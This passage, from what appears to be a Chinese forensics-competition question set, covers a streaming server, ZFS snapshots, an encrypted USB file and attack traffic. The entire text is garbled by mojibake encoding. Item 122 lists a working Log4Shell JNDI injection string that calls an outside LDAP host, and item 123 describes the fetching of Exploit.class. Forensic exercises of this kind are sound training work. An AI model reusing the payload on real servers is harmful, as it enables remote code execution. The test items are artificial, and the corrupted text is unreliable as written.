â€˜Sâ€™ å¼€å¤´çš„, è¯¥ç”¨æˆ·çš„å§“æ°æ˜¯ä»€ä¹ˆ? (ä»¥å¤§å†™è‹±æ–‡å›ç­”)    3    å¡«ç©º</h1><h1 id="107-è¯¥æµåª’ä½“æœåŠ¡å™¨æ˜¯æœ‰ä½¿ç”¨Dockerå®¹å™¨-Docker-Container-çš„ï¼Œå½“ä¸­åŒ…å«ä»¥ä¸‹å“ªä¸ªDockeré•œåƒ-Docker-Image-3"><a href="#107-è¯¥æµåª’ä½“æœåŠ¡å™¨æ˜¯æœ‰ä½¿ç”¨Dockerå®¹å™¨-Docker-Container-çš„ï¼Œå½“ä¸­åŒ…å«ä»¥ä¸‹å“ªä¸ªDockeré•œåƒ-Docker-Image-3" class="headerlink" title="107    è¯¥æµåª’ä½“æœåŠ¡å™¨æ˜¯æœ‰ä½¿ç”¨Dockerå®¹å™¨ (Docker Container) çš„ï¼Œå½“ä¸­åŒ…å«ä»¥ä¸‹å“ªä¸ªDockeré•œåƒ (Docker Image) ?    3"></a>107    è¯¥æµåª’ä½“æœåŠ¡å™¨æ˜¯æœ‰ä½¿ç”¨Dockerå®¹å™¨ (Docker Container) çš„ï¼Œå½“ä¸­åŒ…å«ä»¥ä¸‹å“ªä¸ªDockeré•œåƒ (Docker Image) ?    3</h1><p>å¤šé€‰    A:apache2;<br>B:ubuntu;<br>C:centos;<br>D:nginx;<br>E:hello-world;F:ä»¥ä¸Šçš†é    </p><h1 id="108-å°±ä¸Šè¿°çš„Dockeré•œåƒï¼Œå“ªä¸€ä¸ªé•œåƒåœ¨ç³»ç»Ÿä¸Šè¿è¡Œä¸­-2"><a href="#108-å°±ä¸Šè¿°çš„Dockeré•œåƒï¼Œå“ªä¸€ä¸ªé•œåƒåœ¨ç³»ç»Ÿä¸Šè¿è¡Œä¸­-2" class="headerlink" title="108    å°±ä¸Šè¿°çš„Dockeré•œåƒï¼Œå“ªä¸€ä¸ªé•œåƒåœ¨ç³»ç»Ÿä¸Šè¿è¡Œä¸­?    2"></a>108    å°±ä¸Šè¿°çš„Dockeré•œåƒï¼Œå“ªä¸€ä¸ªé•œåƒåœ¨ç³»ç»Ÿä¸Šè¿è¡Œä¸­?    2</h1><p>å•é€‰<br>A:apache2;<br>B:ubuntu;<br>C:centos;<br>D:nginx;<br>E:hello-world;F:ä»¥ä¸Šçš†é    </p><h1 id="109-è¯¥æµåª’ä½“æœåŠ¡å™¨æ˜¯ä½¿ç”¨-â€˜WordPressâ€™-å»ºç«™-Create-Website-çš„ï¼Œ-å°±-â€˜æ¯”ç‰¹å¸â€™-æ ‡é¢˜ï¼Œ-æœ‰ä»¥ä¸‹çš„ç”µå­é‚®ç®±åœ°å€æ›¾ç»ç•™æœ‰è¯„è®º-2"><a href="#109-è¯¥æµåª’ä½“æœåŠ¡å™¨æ˜¯ä½¿ç”¨-â€˜WordPressâ€™-å»ºç«™-Create-Website-çš„ï¼Œ-å°±-â€˜æ¯”ç‰¹å¸â€™-æ ‡é¢˜ï¼Œ-æœ‰ä»¥ä¸‹çš„ç”µå­é‚®ç®±åœ°å€æ›¾ç»ç•™æœ‰è¯„è®º-2" class="headerlink" title="109    è¯¥æµåª’ä½“æœåŠ¡å™¨æ˜¯ä½¿ç”¨ â€˜WordPressâ€™ å»ºç«™ (Create Website) çš„ï¼Œ å°± â€˜æ¯”ç‰¹å¸â€™ æ ‡é¢˜ï¼Œ æœ‰ä»¥ä¸‹çš„ç”µå­é‚®ç®±åœ°å€æ›¾ç»ç•™æœ‰è¯„è®º?    2"></a>109    è¯¥æµåª’ä½“æœåŠ¡å™¨æ˜¯ä½¿ç”¨ â€˜WordPressâ€™ å»ºç«™ (Create Website) çš„ï¼Œ å°± â€˜æ¯”ç‰¹å¸â€™ æ ‡é¢˜ï¼Œ æœ‰ä»¥ä¸‹çš„ç”µå­é‚®ç®±åœ°å€æ›¾ç»ç•™æœ‰è¯„è®º?    2</h1><p>å¤šé€‰    A:cn.wordpress.org;<br>B:root58462@mail.qq.com;<br>C:hi456@163.com;<br>D:root@163.com;<br>E:user1@localhost.net;F:ä»¥ä¸Šçš†é    </p><h1 id="110-è¯¥æµåª’ä½“æœåŠ¡å™¨é‡Œå…¶ä¸­ä¸€ä¸ªæœ¬åœ°ç”¨æˆ·æ˜¯æœ‰ä½¿ç”¨-â€˜calendarâ€™-æ—¥å†å·¥å…·çš„-æ—¥å†å†…æ›¾ç»æåŠä»¥ä¸‹å“ªä¸ªç½‘ç«™-3"><a href="#110-è¯¥æµåª’ä½“æœåŠ¡å™¨é‡Œå…¶ä¸­ä¸€ä¸ªæœ¬åœ°ç”¨æˆ·æ˜¯æœ‰ä½¿ç”¨-â€˜calendarâ€™-æ—¥å†å·¥å…·çš„-æ—¥å†å†…æ›¾ç»æåŠä»¥ä¸‹å“ªä¸ªç½‘ç«™-3" class="headerlink" title="110    è¯¥æµåª’ä½“æœåŠ¡å™¨é‡Œå…¶ä¸­ä¸€ä¸ªæœ¬åœ°ç”¨æˆ·æ˜¯æœ‰ä½¿ç”¨ â€˜calendarâ€™ æ—¥å†å·¥å…·çš„, æ—¥å†å†…æ›¾ç»æåŠä»¥ä¸‹å“ªä¸ªç½‘ç«™?    3"></a>110    è¯¥æµåª’ä½“æœåŠ¡å™¨é‡Œå…¶ä¸­ä¸€ä¸ªæœ¬åœ°ç”¨æˆ·æ˜¯æœ‰ä½¿ç”¨ â€˜calendarâ€™ æ—¥å†å·¥å…·çš„, æ—¥å†å†…æ›¾ç»æåŠä»¥ä¸‹å“ªä¸ªç½‘ç«™?    3</h1><p>å•é€‰<br>A:<a href="https://weibo.com">https://weibo.com</a>;<br>B:<a href="http://www.baidu.com">http://www.baidu.com</a>;<br>C:<a href="https://www.douyin.com">https://www.douyin.com</a>;<br>D:<a href="https://youku.com">https://youku.com</a>;<br>E:<a href="https://www.binance.com;F:ä»¥ä¸Šçš†é">https://www.binance.com;F:ä»¥ä¸Šçš†é</a>    </p><h1 id="111-è¯¥æµåª’ä½“æœåŠ¡å™¨é‡Œæ˜¯æœ‰ä½¿ç”¨ç£ç›˜é˜µåˆ—-RAID-çš„-è¯¥è®¾å¤‡æ˜¯ä½¿ç”¨å“ªä¸€ä¸ª-RAID-çº§åˆ«-è¯·é€‰æ‹©æœ€åˆé€‚çš„ç­”æ¡ˆ-1"><a href="#111-è¯¥æµåª’ä½“æœåŠ¡å™¨é‡Œæ˜¯æœ‰ä½¿ç”¨ç£ç›˜é˜µåˆ—-RAID-çš„-è¯¥è®¾å¤‡æ˜¯ä½¿ç”¨å“ªä¸€ä¸ª-RAID-çº§åˆ«-è¯·é€‰æ‹©æœ€åˆé€‚çš„ç­”æ¡ˆ-1" class="headerlink" title="111    è¯¥æµåª’ä½“æœåŠ¡å™¨é‡Œæ˜¯æœ‰ä½¿ç”¨ç£ç›˜é˜µåˆ— (RAID) çš„,  è¯¥è®¾å¤‡æ˜¯ä½¿ç”¨å“ªä¸€ä¸ª RAID çº§åˆ«? (è¯·é€‰æ‹©æœ€åˆé€‚çš„ç­”æ¡ˆ)    1"></a>111    è¯¥æµåª’ä½“æœåŠ¡å™¨é‡Œæ˜¯æœ‰ä½¿ç”¨ç£ç›˜é˜µåˆ— (RAID) çš„,  è¯¥è®¾å¤‡æ˜¯ä½¿ç”¨å“ªä¸€ä¸ª RAID çº§åˆ«? (è¯·é€‰æ‹©æœ€åˆé€‚çš„ç­”æ¡ˆ)    1</h1><p>å•é€‰<br>A:RAID 0;<br>B:RAIDz2;<br>C:RAIDz3;<br>D:RAID 10;<br>E:RAID 5;F:ä»¥ä¸Šçš†é    </p><h1 id="112-è¯¥åŸºæœ¬é•œåƒå­˜å‚¨æ± -Basic-Storage-Pool-é‡Œå‚¨å­˜äº†ä¸€äº›è§†é¢‘æ¡£æ¡ˆ-è¯·æ‰¾å‡ºä¸€æ®µå„¿ç«¥è‰²æƒ…å½±ç‰‡-è¯¥æ¡£æ¡ˆçš„æœ€åä¿®æ”¹æ—¶é—´æ˜¯ä»€ä¹ˆæœˆä»½-2"><a href="#112-è¯¥åŸºæœ¬é•œåƒå­˜å‚¨æ± -Basic-Storage-Pool-é‡Œå‚¨å­˜äº†ä¸€äº›è§†é¢‘æ¡£æ¡ˆ-è¯·æ‰¾å‡ºä¸€æ®µå„¿ç«¥è‰²æƒ…å½±ç‰‡-è¯¥æ¡£æ¡ˆçš„æœ€åä¿®æ”¹æ—¶é—´æ˜¯ä»€ä¹ˆæœˆä»½-2" class="headerlink" title="112    è¯¥åŸºæœ¬é•œåƒå­˜å‚¨æ±  (Basic Storage Pool) é‡Œå‚¨å­˜äº†ä¸€äº›è§†é¢‘æ¡£æ¡ˆ, è¯·æ‰¾å‡ºä¸€æ®µå„¿ç«¥è‰²æƒ…å½±ç‰‡, è¯¥æ¡£æ¡ˆçš„æœ€åä¿®æ”¹æ—¶é—´æ˜¯ä»€ä¹ˆæœˆä»½?    2"></a>112    è¯¥åŸºæœ¬é•œåƒå­˜å‚¨æ±  (Basic Storage Pool) é‡Œå‚¨å­˜äº†ä¸€äº›è§†é¢‘æ¡£æ¡ˆ, è¯·æ‰¾å‡ºä¸€æ®µå„¿ç«¥è‰²æƒ…å½±ç‰‡, è¯¥æ¡£æ¡ˆçš„æœ€åä¿®æ”¹æ—¶é—´æ˜¯ä»€ä¹ˆæœˆä»½?    2</h1><p>å•é€‰<br>A:Jun;<br>B:Jul;<br>C:Aug;<br>D:Sep;<br>E:Oct;F:ä»¥ä¸Šçš†é    </p><h1 id="113-æ‰¿ä¸Šé¢˜ï¼Œæ‹¥æœ‰è¯¥æ®µå„¿ç«¥è‰²æƒ…å½±ç‰‡çš„ç”¨æˆ·åç§°æ˜¯ä»€ä¹ˆ-ä¸è¦è¾“å…¥ç¬¦å·ï¼Œä»¥å¤§å†™è‹±æ–‡åŠé˜¿æ‹‰ä¼¯æ•°å­—å›ç­”-1-å¡«ç©º"><a href="#113-æ‰¿ä¸Šé¢˜ï¼Œæ‹¥æœ‰è¯¥æ®µå„¿ç«¥è‰²æƒ…å½±ç‰‡çš„ç”¨æˆ·åç§°æ˜¯ä»€ä¹ˆ-ä¸è¦è¾“å…¥ç¬¦å·ï¼Œä»¥å¤§å†™è‹±æ–‡åŠé˜¿æ‹‰ä¼¯æ•°å­—å›ç­”-1-å¡«ç©º" class="headerlink" title="113    æ‰¿ä¸Šé¢˜ï¼Œæ‹¥æœ‰è¯¥æ®µå„¿ç«¥è‰²æƒ…å½±ç‰‡çš„ç”¨æˆ·åç§°æ˜¯ä»€ä¹ˆ?  (ä¸è¦è¾“å…¥ç¬¦å·ï¼Œä»¥å¤§å†™è‹±æ–‡åŠé˜¿æ‹‰ä¼¯æ•°å­—å›ç­”)    1    å¡«ç©º"></a>113    æ‰¿ä¸Šé¢˜ï¼Œæ‹¥æœ‰è¯¥æ®µå„¿ç«¥è‰²æƒ…å½±ç‰‡çš„ç”¨æˆ·åç§°æ˜¯ä»€ä¹ˆ?  (ä¸è¦è¾“å…¥ç¬¦å·ï¼Œä»¥å¤§å†™è‹±æ–‡åŠé˜¿æ‹‰ä¼¯æ•°å­—å›ç­”)    1    å¡«ç©º</h1><h1 id="114-å°±AGCé›†å›¢ç½‘ç»œçš„æµåª’ä½“æœåŠ¡å™¨ï¼Œæ›¾ç»æœ‰ç”¨æˆ·æœç´¢è¿‡æœ‰å…³äºå„¿ç«¥è‰²æƒ…å½±ç‰‡çš„èµ„æ–™è€Œå¾—åˆ°æœç´¢ç»“æœï¼Œè¯¥ç”¨æˆ·æ‰€è¾“å…¥çš„ç½‘å€æ˜¯ä»€ä¹ˆ-ä¸è¦è¾“å…¥ç¬¦å·ï¼Œä»¥å¤§å†™è‹±æ–‡åŠé˜¿æ‹‰ä¼¯æ•°å­—å›ç­”ï¼Œå¦‚-https-web3-comï¼Œéœ€å›ç­”-HTTPSWEB3COM-2-å¡«ç©º"><a href="#114-å°±AGCé›†å›¢ç½‘ç»œçš„æµåª’ä½“æœåŠ¡å™¨ï¼Œæ›¾ç»æœ‰ç”¨æˆ·æœç´¢è¿‡æœ‰å…³äºå„¿ç«¥è‰²æƒ…å½±ç‰‡çš„èµ„æ–™è€Œå¾—åˆ°æœç´¢ç»“æœï¼Œè¯¥ç”¨æˆ·æ‰€è¾“å…¥çš„ç½‘å€æ˜¯ä»€ä¹ˆ-ä¸è¦è¾“å…¥ç¬¦å·ï¼Œä»¥å¤§å†™è‹±æ–‡åŠé˜¿æ‹‰ä¼¯æ•°å­—å›ç­”ï¼Œå¦‚-https-web3-comï¼Œéœ€å›ç­”-HTTPSWEB3COM-2-å¡«ç©º" class="headerlink" title="114    å°±AGCé›†å›¢ç½‘ç»œçš„æµåª’ä½“æœåŠ¡å™¨ï¼Œæ›¾ç»æœ‰ç”¨æˆ·æœç´¢è¿‡æœ‰å…³äºå„¿ç«¥è‰²æƒ…å½±ç‰‡çš„èµ„æ–™è€Œå¾—åˆ°æœç´¢ç»“æœï¼Œè¯¥ç”¨æˆ·æ‰€è¾“å…¥çš„ç½‘å€æ˜¯ä»€ä¹ˆ? (ä¸è¦è¾“å…¥ç¬¦å·ï¼Œä»¥å¤§å†™è‹±æ–‡åŠé˜¿æ‹‰ä¼¯æ•°å­—å›ç­”ï¼Œå¦‚ https://web3.comï¼Œéœ€å›ç­” HTTPSWEB3COM)    2    å¡«ç©º"></a>114    å°±AGCé›†å›¢ç½‘ç»œçš„æµåª’ä½“æœåŠ¡å™¨ï¼Œæ›¾ç»æœ‰ç”¨æˆ·æœç´¢è¿‡æœ‰å…³äºå„¿ç«¥è‰²æƒ…å½±ç‰‡çš„èµ„æ–™è€Œå¾—åˆ°æœç´¢ç»“æœï¼Œè¯¥ç”¨æˆ·æ‰€è¾“å…¥çš„ç½‘å€æ˜¯ä»€ä¹ˆ? (ä¸è¦è¾“å…¥ç¬¦å·ï¼Œä»¥å¤§å†™è‹±æ–‡åŠé˜¿æ‹‰ä¼¯æ•°å­—å›ç­”ï¼Œå¦‚ <a href="https://web3.comï¼Œéœ€å›ç­”">https://web3.comï¼Œéœ€å›ç­”</a> HTTPSWEB3COM)    2    å¡«ç©º</h1><h1 id="115-è¯¥åŸºæœ¬é•œåƒå­˜å‚¨æ± -pool-æœ‰ä¸€ä¸ªå¿«ç…§-Snapshot-ï¼Œå¿«ç…§çš„åç§°æ˜¯ä»€ä¹ˆ-ä¸è¦è¾“å…¥ç¬¦å·ï¼Œä»¥å¤§å†™è‹±æ–‡åŠé˜¿æ‹‰ä¼¯æ•°å­—å›ç­”ï¼Œå¦‚-media-mediapool-abc123ï¼Œéœ€å›ç­”MEDIAMEDIAPOOLABC123-1-å¡«ç©º"><a href="#115-è¯¥åŸºæœ¬é•œåƒå­˜å‚¨æ± -pool-æœ‰ä¸€ä¸ªå¿«ç…§-Snapshot-ï¼Œå¿«ç…§çš„åç§°æ˜¯ä»€ä¹ˆ-ä¸è¦è¾“å…¥ç¬¦å·ï¼Œä»¥å¤§å†™è‹±æ–‡åŠé˜¿æ‹‰ä¼¯æ•°å­—å›ç­”ï¼Œå¦‚-media-mediapool-abc123ï¼Œéœ€å›ç­”MEDIAMEDIAPOOLABC123-1-å¡«ç©º" class="headerlink" title="115    è¯¥åŸºæœ¬é•œåƒå­˜å‚¨æ±  (pool) æœ‰ä¸€ä¸ªå¿«ç…§ (Snapshot)ï¼Œå¿«ç…§çš„åç§°æ˜¯ä»€ä¹ˆ? (ä¸è¦è¾“å…¥ç¬¦å·ï¼Œä»¥å¤§å†™è‹±æ–‡åŠé˜¿æ‹‰ä¼¯æ•°å­—å›ç­”ï¼Œå¦‚ media/mediapool@abc123ï¼Œéœ€å›ç­”MEDIAMEDIAPOOLABC123)    1    å¡«ç©º"></a>115    è¯¥åŸºæœ¬é•œåƒå­˜å‚¨æ±  (pool) æœ‰ä¸€ä¸ªå¿«ç…§ (Snapshot)ï¼Œå¿«ç…§çš„åç§°æ˜¯ä»€ä¹ˆ? (ä¸è¦è¾“å…¥ç¬¦å·ï¼Œä»¥å¤§å†™è‹±æ–‡åŠé˜¿æ‹‰ä¼¯æ•°å­—å›ç­”ï¼Œå¦‚ media/mediapool@abc123ï¼Œéœ€å›ç­”MEDIAMEDIAPOOLABC123)    1    å¡«ç©º</h1><h1 id="116-å°±ä¸Šè¿°æ‰€æ‰¾åˆ°çš„åŸºæœ¬é•œåƒå­˜å‚¨æ± å¿«ç…§-Snapshot-ï¼Œå®ƒå‚¨å­˜äº†å¤šå°‘ä¸ªæ¡£æ¡ˆ-ä»¥é˜¿æ‹‰ä¼¯æ•°å­—å›ç­”-1-å¡«ç©º"><a href="#116-å°±ä¸Šè¿°æ‰€æ‰¾åˆ°çš„åŸºæœ¬é•œåƒå­˜å‚¨æ± å¿«ç…§-Snapshot-ï¼Œå®ƒå‚¨å­˜äº†å¤šå°‘ä¸ªæ¡£æ¡ˆ-ä»¥é˜¿æ‹‰ä¼¯æ•°å­—å›ç­”-1-å¡«ç©º" class="headerlink" title="116    å°±ä¸Šè¿°æ‰€æ‰¾åˆ°çš„åŸºæœ¬é•œåƒå­˜å‚¨æ± å¿«ç…§ (Snapshot)ï¼Œå®ƒå‚¨å­˜äº†å¤šå°‘ä¸ªæ¡£æ¡ˆ? (ä»¥é˜¿æ‹‰ä¼¯æ•°å­—å›ç­”)    1    å¡«ç©º"></a>116    å°±ä¸Šè¿°æ‰€æ‰¾åˆ°çš„åŸºæœ¬é•œåƒå­˜å‚¨æ± å¿«ç…§ (Snapshot)ï¼Œå®ƒå‚¨å­˜äº†å¤šå°‘ä¸ªæ¡£æ¡ˆ? (ä»¥é˜¿æ‹‰ä¼¯æ•°å­—å›ç­”)    1    å¡«ç©º</h1><h1 id="117-ç‹æ™¯æµ©çš„USBè®°å¿†æ£’é‡Œæœ‰ä¸€ä¸ª-â€˜Dataâ€™-æ–‡ä»¶å¤¹-Folder-ï¼Œå®ƒå­˜æœ‰å“ªä¸€ç§ç±»å‹çš„å¯†é’¥æ–‡ä»¶-1"><a href="#117-ç‹æ™¯æµ©çš„USBè®°å¿†æ£’é‡Œæœ‰ä¸€ä¸ª-â€˜Dataâ€™-æ–‡ä»¶å¤¹-Folder-ï¼Œå®ƒå­˜æœ‰å“ªä¸€ç§ç±»å‹çš„å¯†é’¥æ–‡ä»¶-1" class="headerlink" title="117    ç‹æ™¯æµ©çš„USBè®°å¿†æ£’é‡Œæœ‰ä¸€ä¸ª â€˜Dataâ€™ æ–‡ä»¶å¤¹ (Folder)ï¼Œå®ƒå­˜æœ‰å“ªä¸€ç§ç±»å‹çš„å¯†é’¥æ–‡ä»¶?    1"></a>117    ç‹æ™¯æµ©çš„USBè®°å¿†æ£’é‡Œæœ‰ä¸€ä¸ª â€˜Dataâ€™ æ–‡ä»¶å¤¹ (Folder)ï¼Œå®ƒå­˜æœ‰å“ªä¸€ç§ç±»å‹çš„å¯†é’¥æ–‡ä»¶?    1</h1><p>å•é€‰<br>A:pem;<br>B:cer;<br>C:crt;<br>D:key;<br>E:ä»¥ä¸Šçš†é    </p><h1 id="118-æ‰¿ä¸Šé¢˜ï¼Œâ€™Dataâ€™-æ–‡ä»¶å¤¹é‡Œæœ‰ä¸€ä¸ªè¢«åŠ å¯†äº†çš„æ¡£æ¡ˆï¼Œå®ƒæ˜¯è¢«å“ªä¸€ç§åŠ å¯†æ–¹æ³•åŠ å¯†-2"><a href="#118-æ‰¿ä¸Šé¢˜ï¼Œâ€™Dataâ€™-æ–‡ä»¶å¤¹é‡Œæœ‰ä¸€ä¸ªè¢«åŠ å¯†äº†çš„æ¡£æ¡ˆï¼Œå®ƒæ˜¯è¢«å“ªä¸€ç§åŠ å¯†æ–¹æ³•åŠ å¯†-2" class="headerlink" title="118    æ‰¿ä¸Šé¢˜ï¼Œâ€™Dataâ€™ æ–‡ä»¶å¤¹é‡Œæœ‰ä¸€ä¸ªè¢«åŠ å¯†äº†çš„æ¡£æ¡ˆï¼Œå®ƒæ˜¯è¢«å“ªä¸€ç§åŠ å¯†æ–¹æ³•åŠ å¯†?    2"></a>118    æ‰¿ä¸Šé¢˜ï¼Œâ€™Dataâ€™ æ–‡ä»¶å¤¹é‡Œæœ‰ä¸€ä¸ªè¢«åŠ å¯†äº†çš„æ¡£æ¡ˆï¼Œå®ƒæ˜¯è¢«å“ªä¸€ç§åŠ å¯†æ–¹æ³•åŠ å¯†?    2</h1><p>å¤šé€‰    A:Symmetric;<br>B:PGP;<br>C:Twofish;<br>D:RSA;<br>E:Triple DES    </p><h1 id="119-å°è¯•å°†æ¡£æ¡ˆè§£å¯†ï¼Œè¯¥æ¡£æ¡ˆå±äºå“ªä¸€ä¸ªç±»å‹-File-type-2"><a href="#119-å°è¯•å°†æ¡£æ¡ˆè§£å¯†ï¼Œè¯¥æ¡£æ¡ˆå±äºå“ªä¸€ä¸ªç±»å‹-File-type-2" class="headerlink" title="119    å°è¯•å°†æ¡£æ¡ˆè§£å¯†ï¼Œè¯¥æ¡£æ¡ˆå±äºå“ªä¸€ä¸ªç±»å‹ (File type)?    2"></a>119    å°è¯•å°†æ¡£æ¡ˆè§£å¯†ï¼Œè¯¥æ¡£æ¡ˆå±äºå“ªä¸€ä¸ªç±»å‹ (File type)?    2</h1><p>å•é€‰<br>A:exe;<br>B:ods;<br>C:rtf;<br>D:sql;<br>E:ä»¥ä¸Šçš†é    </p><h1 id="120-æ‰¿ä¸Šé¢˜ï¼Œæ‰¾å‡ºä»¥ä¸‹å“ªä¸€ä¸ªåå­—å‡ºç°åœ¨è¯¥æ¡£æ¡ˆé‡Œ-3"><a href="#120-æ‰¿ä¸Šé¢˜ï¼Œæ‰¾å‡ºä»¥ä¸‹å“ªä¸€ä¸ªåå­—å‡ºç°åœ¨è¯¥æ¡£æ¡ˆé‡Œ-3" class="headerlink" title="120    æ‰¿ä¸Šé¢˜ï¼Œæ‰¾å‡ºä»¥ä¸‹å“ªä¸€ä¸ªåå­—å‡ºç°åœ¨è¯¥æ¡£æ¡ˆé‡Œ?    3"></a>120    æ‰¿ä¸Šé¢˜ï¼Œæ‰¾å‡ºä»¥ä¸‹å“ªä¸€ä¸ªåå­—å‡ºç°åœ¨è¯¥æ¡£æ¡ˆé‡Œ?    3</h1><p>å¤šé€‰    A:Armand To;<br>B:Adam Smasher;<br>C:Beverly Kot;<br>D:Huma Chan;<br>E:ä»¥ä¸Šçš†é    </p><h1 id="121-åˆ†æIPåœ°å€61-238-217-108å‘AGCæœåŠ¡å™¨10-0-66-184å‘é€çš„ç¬¬ä¸€ä¸ª-â€˜GETâ€™-æŒ‡ä»¤ï¼Œå®ƒè¯·æ±‚çš„ç»Ÿä¸€èµ„æºå®šä½ç³»ç»Ÿ-Uniform-Resource-Locator-URL-æ˜¯ä»€ä¹ˆ-1"><a href="#121-åˆ†æIPåœ°å€61-238-217-108å‘AGCæœåŠ¡å™¨10-0-66-184å‘é€çš„ç¬¬ä¸€ä¸ª-â€˜GETâ€™-æŒ‡ä»¤ï¼Œå®ƒè¯·æ±‚çš„ç»Ÿä¸€èµ„æºå®šä½ç³»ç»Ÿ-Uniform-Resource-Locator-URL-æ˜¯ä»€ä¹ˆ-1" class="headerlink" title="121    åˆ†æIPåœ°å€61.238.217.108å‘AGCæœåŠ¡å™¨10.0.66.184å‘é€çš„ç¬¬ä¸€ä¸ª â€˜GETâ€™ æŒ‡ä»¤ï¼Œå®ƒè¯·æ±‚çš„ç»Ÿä¸€èµ„æºå®šä½ç³»ç»Ÿ (Uniform Resource Locator - URL) æ˜¯ä»€ä¹ˆ?    1"></a>121    åˆ†æIPåœ°å€61.238.217.108å‘AGCæœåŠ¡å™¨10.0.66.184å‘é€çš„ç¬¬ä¸€ä¸ª â€˜GETâ€™ æŒ‡ä»¤ï¼Œå®ƒè¯·æ±‚çš„ç»Ÿä¸€èµ„æºå®šä½ç³»ç»Ÿ (Uniform Resource Locator - URL) æ˜¯ä»€ä¹ˆ?    1</h1><p>å•é€‰<br>A:<a href="http://155.137.195.111:8080">http://155.137.195.111:8080</a>;<br>B:<a href="http://www.w3.org/2003/05/soap-envelope">http://www.w3.org/2003/05/soap-envelope</a>;<br>C:<a href="http://61.238.217.108:8000">http://61.238.217.108:8000</a>;<br>D:ä»¥ä¸Šçš†é    </p><h1 id="122-IPåœ°å€61-238-217-108æ›¾ç»å‘AGCæœåŠ¡å™¨10-0-66-184å‘é€-â€˜POSTâ€™-æŒ‡ä»¤ï¼Œå®ƒåœ¨-â€˜HTML-Formâ€™-é¡¹ç›®çš„-â€˜unameâ€™-æ æ‰€è¾“å…¥çš„å­—ç¬¦ä¸²æ˜¯ä»€ä¹ˆ-1"><a href="#122-IPåœ°å€61-238-217-108æ›¾ç»å‘AGCæœåŠ¡å™¨10-0-66-184å‘é€-â€˜POSTâ€™-æŒ‡ä»¤ï¼Œå®ƒåœ¨-â€˜HTML-Formâ€™-é¡¹ç›®çš„-â€˜unameâ€™-æ æ‰€è¾“å…¥çš„å­—ç¬¦ä¸²æ˜¯ä»€ä¹ˆ-1" class="headerlink" title="122    IPåœ°å€61.238.217.108æ›¾ç»å‘AGCæœåŠ¡å™¨10.0.66.184å‘é€ â€˜POSTâ€™ æŒ‡ä»¤ï¼Œå®ƒåœ¨ â€˜HTML Formâ€™ é¡¹ç›®çš„ â€˜unameâ€™ æ æ‰€è¾“å…¥çš„å­—ç¬¦ä¸²æ˜¯ä»€ä¹ˆ?    1"></a>122    IPåœ°å€61.238.217.108æ›¾ç»å‘AGCæœåŠ¡å™¨10.0.66.184å‘é€ â€˜POSTâ€™ æŒ‡ä»¤ï¼Œå®ƒåœ¨ â€˜HTML Formâ€™ é¡¹ç›®çš„ â€˜unameâ€™ æ æ‰€è¾“å…¥çš„å­—ç¬¦ä¸²æ˜¯ä»€ä¹ˆ?    1</h1><p>å•é€‰<br>A:root;<br>B:${jndi:ldap://61.238.217.108:1389/a};<br>C:application/x-www-form-urlencoded;<br>D:password    </p><h1 id="123-AGCæœåŠ¡å™¨10-0-66-184æ”¶åˆ°IPåœ°å€61-238-217-108çš„-â€˜POSTâ€™-æŒ‡ä»¤åï¼Œå®ƒæ‰§è¡Œäº†å“ªäº›è¡ŒåŠ¨-2"><a href="#123-AGCæœåŠ¡å™¨10-0-66-184æ”¶åˆ°IPåœ°å€61-238-217-108çš„-â€˜POSTâ€™-æŒ‡ä»¤åï¼Œå®ƒæ‰§è¡Œäº†å“ªäº›è¡ŒåŠ¨-2" class="headerlink" title="123    AGCæœåŠ¡å™¨10.0.66.184æ”¶åˆ°IPåœ°å€61.238.217.108çš„ â€˜POSTâ€™ æŒ‡ä»¤åï¼Œå®ƒæ‰§è¡Œäº†å“ªäº›è¡ŒåŠ¨?    2"></a>123    AGCæœåŠ¡å™¨10.0.66.184æ”¶åˆ°IPåœ°å€61.238.217.108çš„ â€˜POSTâ€™ æŒ‡ä»¤åï¼Œå®ƒæ‰§è¡Œäº†å“ªäº›è¡ŒåŠ¨?    2</h1><p>å•é€‰<br>A:ä½¿ç”¨ç«¯å£46858è¿æ¥IPåœ°å€61.238.217.108çš„LDAPæœåŠ¡å™¨çš„æŒ‡å®šç«¯å£;<br>B:äºIPåœ°å€61.238.217.108ä¸‹è½½äº†Exploit.class;<br>C:ä½¿ç”¨ç«¯å£49264è¿æ¥IPåœ°å€61.238.217.108å‘é€åŒæ­¥è¦æ±‚;<br>D:ä»¥ä¸Šçš†æ˜¯    </p><h1 id="124-åœ¨ä¸Šè¿°è¡ŒåŠ¨åï¼ŒIPåœ°å€61-238-217-108åˆ©ç”¨å“ªä¸ªç«¯å£-Port-å‘AGCæœåŠ¡å™¨10-0-66-184å‘å‡ºæŒ‡ä»¤-ä»¥é˜¿æ‹‰ä¼¯æ•°å­—å›ç­”-1-å¡«ç©º"><a href="#124-åœ¨ä¸Šè¿°è¡ŒåŠ¨åï¼ŒIPåœ°å€61-238-217-108åˆ©ç”¨å“ªä¸ªç«¯å£-Port-å‘AGCæœåŠ¡å™¨10-0-66-184å‘å‡ºæŒ‡ä»¤-ä»¥é˜¿æ‹‰ä¼¯æ•°å­—å›ç­”-1-å¡«ç©º" class="headerlink" title="124    åœ¨ä¸Šè¿°è¡ŒåŠ¨åï¼ŒIPåœ°å€61.238.217.108åˆ©ç”¨å“ªä¸ªç«¯å£ (Port) å‘AGCæœåŠ¡å™¨10.0.66.184å‘å‡ºæŒ‡ä»¤? (ä»¥é˜¿æ‹‰ä¼¯æ•°å­—å›ç­”)    1    å¡«ç©º"></a>124    åœ¨ä¸Šè¿°è¡ŒåŠ¨åï¼ŒIPåœ°å€61.238.217.108åˆ©ç”¨å“ªä¸ªç«¯å£ (Port) å‘AGCæœåŠ¡å™¨10.0.66.184å‘å‡ºæŒ‡ä»¤? (ä»¥é˜¿æ‹‰ä¼¯æ•°å­—å›ç­”)    1    å¡«ç©º</h1><h1 id="125-AGCæœåŠ¡å™¨10-0-66-184é‡Œæœ‰ä¸€ä¸ªAGCç›®å½•-Directory-ï¼Œå®ƒçš„å­ç›®å½•-Sub-Directory-åŒ…å«ä»¥ä¸‹å“ªä¸€ä¸ª-2"><a href="#125-AGCæœåŠ¡å™¨10-0-66-184é‡Œæœ‰ä¸€ä¸ªAGCç›®å½•-Directory-ï¼Œå®ƒçš„å­ç›®å½•-Sub-Directory-åŒ…å«ä»¥ä¸‹å“ªä¸€ä¸ª-2" class="headerlink" title="125    AGCæœåŠ¡å™¨10.0.66.184é‡Œæœ‰ä¸€ä¸ªAGCç›®å½• (Directory)ï¼Œå®ƒçš„å­ç›®å½• (Sub Directory) åŒ…å«ä»¥ä¸‹å“ªä¸€ä¸ª?    2"></a>125    